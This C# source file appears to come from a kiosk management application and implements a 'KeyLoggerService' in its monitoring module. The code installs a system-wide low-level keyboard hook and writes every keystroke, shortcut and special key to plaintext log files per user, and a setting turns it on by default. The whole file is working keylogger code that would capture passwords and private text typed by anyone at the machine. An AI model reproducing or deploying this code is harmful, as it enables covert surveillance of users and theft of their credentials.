using ApacKiosk.Database;
using ApacKiosk.Interop;
using ApacKiosk.Services;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ApacKiosk.Monitoring;

public class KeyLoggerService : IDisposable
{
    private readonly DatabaseManager _db;
    private readonly LogService _logService;
    private IntPtr _hookId;
    private Win32.LowLevelHookProc? _hookProc;
    private int? _userId;
    private string? _logFilePath;
    private readonly object _fileLock = new();

    public KeyLoggerService(DatabaseManager db, LogService logService)
    {
        _db = db;
        _logService = logService;
    }

    public void Start(int? userId)
    {
        Stop();
        if (!bool.TryParse(_db.GetSetting("keylogger_enabled", "true"), out var enabled) || !enabled)
            return;

        _userId = userId;
        var basePath = _db.GetSetting("keylogger_path");
        var fileMode = _db.GetSetting("keylogger_file_mode", "daily");
        var username = userId.HasValue ? $"user{userId}" : "system";

        try { Directory.CreateDirectory(basePath); } catch { return; }

        if (fileMode == "daily")
            _logFilePath = Path.Combine(basePath, $"keylog_{DateTime.Now:yyyyMMdd}_{username}.txt");
        else
            _logFilePath = Path.Combine(basePath, $"keylog_{DateTime.Now:yyyyMMdd_HHmmss}_{username}.txt");

        _hookProc = HookCallback;
        using var module = Process.GetCurrentProcess().MainModule;
        var moduleHandle = Win32.GetModuleHandle(module?.ModuleName ?? "");
        _hookId = Win32.SetWindowsHookEx(Win32.WH_KEYBOARD_LL, _hookProc, moduleHandle, 0);

        _logService.Log(userId, "keylogger", null, "Keylogger iniciado");
    }

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (int)wParam == Win32.WM_KEYDOWN)
        {
            var kb = (Win32.KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(Win32.KBDLLHOOKSTRUCT))!;
            var vkCode = (int)kb.vkCode;

            bool ctrl = (Win32.GetAsyncKeyState((int)System.Windows.Forms.Keys.ControlKey) & 0x8000) != 0;
            bool alt = (Win32.GetAsyncKeyState((int)System.Windows.Forms.Keys.Menu) & 0x8000) != 0;
            bool shift = (Win32.GetAsyncKeyState((int)System.Windows.Forms.Keys.ShiftKey) & 0x8000) != 0;

            var username = _userId.HasValue ? $"user{_userId}" : "system";
            var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            string keyText;

            if (vkCode == (int)System.Windows.Forms.Keys.Return) keyText = "[ENTER]";
            else if (vkCode == (int)System.Windows.Forms.Keys.Back) keyText = "[BACKSPACE]";
            else if (vkCode == (int)System.Windows.Forms.Keys.Tab) keyText = "[TAB]";
            else if (vkCode == (int)System.Windows.Forms.Keys.Space) keyText = " ";
            else if (vkCode == (int)System.Windows.Forms.Keys.Escape) keyText = "[ESC]";
            else if (ctrl && vkCode == (int)System.Windows.Forms.Keys.C) keyText = "[CTRL+C]";
            else if (ctrl && vkCode == (int)System.Windows.Forms.Keys.V) keyText = "[CTRL+V]";
            else if (ctrl && vkCode == (int)System.Windows.Forms.Keys.X) keyText = "[CTRL+X]";
            else if (ctrl && vkCode == (int)System.Windows.Forms.Keys.A) keyText = "[CTRL+A]";
            else if (ctrl && vkCode == (int)System.Windows.Forms.Keys.Z) keyText = "[CTRL+Z]";
            else if (alt && vkCode == (int)System.Windows.Forms.Keys.Tab) keyText = "[ALT+TAB]";
            else if (vkCode >= 32 && vkCode <= 126)
            {
                keyText = ((char)vkCode).ToString();
            }
            else
            {
                keyText = $"[VK:{vkCode}]";
            }

            var line = $"[{timestamp}] {username}: {keyText}\n";

            lock (_fileLock)
            {
                try
                {
                    File.AppendAllText(_logFilePath!, line);
                }
                catch { }
            }
        }

        return Win32.CallNextHookEx(_hookId, nCode, wParam, lParam);
    }

    public void Stop()
    {
        if (_hookId != IntPtr.Zero)
        {
            Win32.UnhookWindowsHookEx(_hookId);
            _hookId = IntPtr.Zero;
        }
        _hookProc = null;
        _logService.Log(_userId, "keylogger", null, "Keylogger parado");
    }

    public void Dispose()
    {
        Stop();
    }
}
